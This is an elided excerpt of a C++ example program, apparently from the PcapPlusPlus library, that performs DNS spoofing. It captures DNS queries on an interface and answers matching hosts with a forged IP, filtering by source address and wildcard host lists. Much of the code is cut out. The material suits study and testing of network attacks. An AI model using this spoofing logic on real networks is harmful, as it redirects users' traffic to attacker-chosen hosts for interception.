 ...
 * ================================
 * This application does simple DNS spoofing. It's provided with interface name
 * or IP and starts capturing DNS requests on that interface. Each DNS request
 * that matches is edited and turned into a DNS response with a user-provided IP
 * address as the resolved IP. Then it's sent back on the network on the same
 * interface
 */
...
/**
 * A struct that holds all counters that are collected during application
 * runtime
 */
...
void printUsage()
{
    std::cout << std::endl
              ...
              << "------" << std::endl
              << pcpp::AppName::get()
              << " [-hvl] [-o host1,host2,...,host_n] [-c ip_address] -i "
              ...
              << "    -v                          : Displays the current version "
                 "and exists"
              << std::endl
              << "    -l                          : Print the list of available "
                 "interfaces"
              << std::endl
              << "    -i interface                : The interface name or "
                 "interface IP address to use."
              << std::endl
              << "                                  Use the -l switch to see all "
                 "interfaces"
              << std::endl
              << "    -d ip_address               : The IP address of the "
                 "spoofed DNS server. Supports both IPv4 and IPv6"
              << std::endl
              << "                                  (all responses will be sent "
                 "with this IP address)"
              << std::endl
              << "    -c ip_address               : Spoof only DNS requests "
                 "coming from a specific IP address"
              << std::endl
              << "    -o host1,host2,...,host_n   : A comma-separated list of "
                 "hosts to spoof. If list is not given,"
              << std::endl
              << "                                  all hosts will be spoofed. "
                 "If an host contains '*' all sub-domains"
              << std::endl
              << "                                  will be spoofed, for "
                 "example: if '*.google.com' is given"
              << std::endl
              << "                                  then 'mail.google.com', "
                 "'tools.google.com', etc. will be spoofed"
              << std::endl
              << std::endl;
}
...
/**
 * The method that is called each time a DNS request is received. This methods
 * turns the DNS request into a DNS response with the spoofed information and
 * sends it back to the network
 */
void handleDnsRequest(pcpp::RawPacket* packet, pcpp::PcapLiveDevice* dev,
                      void* cookie)
{
    ...
    if (!dnsRequest.isPacketOfType(pcpp::DNS) ||
        !dnsRequest.isPacketOfType(pcpp::IP) ||
        !dnsRequest.isPacketOfType(pcpp::UDP) ||
        !dnsRequest.isPacketOfType(pcpp::Ethernet))
        return;
    ...
    if (dnsLayer->getDnsHeader()->numberOfQuestions != pcpp::hostToNet16(1) ||
        dnsLayer->getFirstQuery() == nullptr)
        return;

    // skip DNS requests which are not of class IN and type A (IPv4) or AAAA
    // (IPv6)
    pcpp::DnsType dnsType =
        (args->dnsServer.isIPv4() ? pcpp::DNS_TYPE_A : pcpp::DNS_TYPE_AAAA);
    pcpp::DnsQuery* dnsQuery = dnsLayer->getFirstQuery();
    if (dnsQuery->getDnsType() != dnsType ||
        dnsQuery->getDnsClass() != pcpp::DNS_CLASS_IN)
        return;
    ...
    if (!args->dnsHostsToSpoof.empty())
    {
        ...
        // go over all hosts in dnsHostsToSpoof list and see if current query
        // matches one of them
        for (std::vector<std::string>::iterator iter =
                 args->dnsHostsToSpoof.begin();
             iter != args->dnsHostsToSpoof.end(); iter++)
        {
    ...
    if (args->dnsServer.isIPv4())
    {
        ...
        if (!dnsLayer->addAnswer(dnsQuery->getName(), pcpp::DNS_TYPE_A,
                                 pcpp::DNS_CLASS_IN, 1, &dnsServer))
            return;
    }
    else
    {
        pcpp::IPv6DnsResourceData dnsServer(args->dnsServer.getIPv6());
        if (!dnsLayer->addAnswer(dnsQuery->getName(), pcpp::DNS_TYPE_AAAA,
                                 pcpp::DNS_CLASS_IN, 1, &dnsServer))
            return;
    }
...
/**
 * An auxiliary method for sorting the string count map. Used for printing the
...
/**
 * A callback for application interrupted event (ctrl+c): print DNS spoofing
 * summary
 */
void onApplicationInterrupted(void* cookie)
{
    ...
    else
    {
        std::cout << std::endl
                  ...
                  << std::endl
                  << "Total spoofed:          "
                  << args->stats.numOfSpoofedDnsRequests << std::endl
        ...
        std::vector<std::pair<std::string, int>> map2vec(
            args->stats.spoofedHosts.begin(), args->stats.spoofedHosts.end());
 ...
 */
void doDnsSpoofing(pcpp::PcapLiveDevice* dev, const pcpp::IPAddress& dnsServer,
                   ...
                   const std::vector<std::string>& dnsHostsToSpoof)
{
    ...
    {
        std::cout << "Spoofed " << args.stats.numOfSpoofedDnsRequests
                  << " DNS requests so far" << std::endl;
...
int main(int argc, char* argv[])
{
    ...
    while ((opt = getopt_long(argc, argv, "i:d:c:o:hvl", DnsSpoofingOptions,
                              &optionIndex)) != -1)
    {
        switch (opt)
        {
    ...
    {
        EXIT_WITH_ERROR("Interface name or IP weren't provided. Please use the -i "
                        "switch or -h for help");
    }
    ...
    if (dnsServer == pcpp::IPv4Address::Zero || !dnsServer.isValid())
        EXIT_WITH_ERROR(
            "Spoof DNS server IP provided is empty or not a valid IPv4 address");
